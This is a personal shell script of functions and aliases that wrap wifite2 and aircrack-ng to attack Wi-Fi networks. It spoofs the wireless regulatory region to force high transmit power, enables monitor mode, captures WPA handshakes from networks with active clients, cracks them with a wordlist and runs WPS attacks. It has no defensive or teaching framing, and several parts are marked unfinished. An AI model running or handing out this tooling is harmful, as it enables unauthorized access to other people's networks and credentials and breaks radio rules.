#!/bin/sh

# unused shebang
#! /usr/bin/env nix-shell
#! nix-shell -p iproute2 iw wifite2 aircrack-ng

alias get_first_iface="\command ls /sys/class/ieee80211/*/device/net/ | cut -d' ' -f1 | head -n 1"

restore_wifi() {
  (
    iface=${1:-wlp2s0}
    old_region=${2:-RU}
    sudo airmon-ng stop "$iface"mon
    sudo ip link set "$iface" down
    sudo iw reg set $old_region
    sudo iw dev $iface set power_save on
    sudo iw dev $iface set txpower auto
    sudo ip link set "$iface" up
  )
}

prepare_wifi() {  # TODO WIP
  (
    # iface_iw=phy0
    # ls /sys/class/ieee80211/*/device/net/* -d | sed -E 's|^.*(phy[^/]+)/.*/|\1 |'
    iface=${1:-$(get_first_iface)}
    new_region=${2:-PA}
    # clear  # TODO WIP
    # stop if any
    sudo airmon-ng stop "$iface"mon
    sudo ip link set "$iface" down
    echo "Old region was $(iw reg get)"  # TODO WIP
    sudo iw reg set "$new_region"
    echo "New region is $(iw reg get)"  # TODO WIP
    # sudo iw phy $iface_iw reg set $new_region  # TODO https://hackware.ru/?p=4125
    iw dev "$iface" get power_save
    sudo iw dev "$iface" set power_save off
    iw dev "$iface" get power_save
    sudo iw dev "$iface" set txpower fixed 30mBm  # TODO WIP
    sudo ip link set "$iface" up
    iw dev
    sudo airmon-ng check kill
    sudo airmon-ng start "$iface"
    iw dev
  )
}

prepare_wifite() {
  prepare_wifi "$1"
  return  # TODO WIP
}

handshake_capture() {  # TODO WIP
  (
    iface=${1:-$(get_first_iface)}
    prepare_wifite "$iface" || return 1  # TODO WIP
    mkdir -p ~/hs
    sudo wifite -ab -mac --skip-crack -ic --showb --showm -i "$iface"mon -inf -p 900 --clients-only --no-wps --wpadt 30 --wpat 1200 --no-pmkid --hs-dir ~/hs
    restore_wifi "$iface"
  )
}

# TODO WIP
alias crack_hs="mkdir -p ~/hs && sudo wifite --crack -ic --dict ~/wordlist-probable.txt --hs-dir ~/hs"

wps_attack() {  # TODO WIP
  (
    iface=${1:-wlp2s0}
    prepare_wifite "$iface" || return 1  # TODO WIP
    sudo wifite -ab -mac --skip-crack -ic --showb --showm -i "$iface"mon -inf -p 900 --wps-only --wps-timeouts 1000
    restore_wifi "$iface"
  )
}
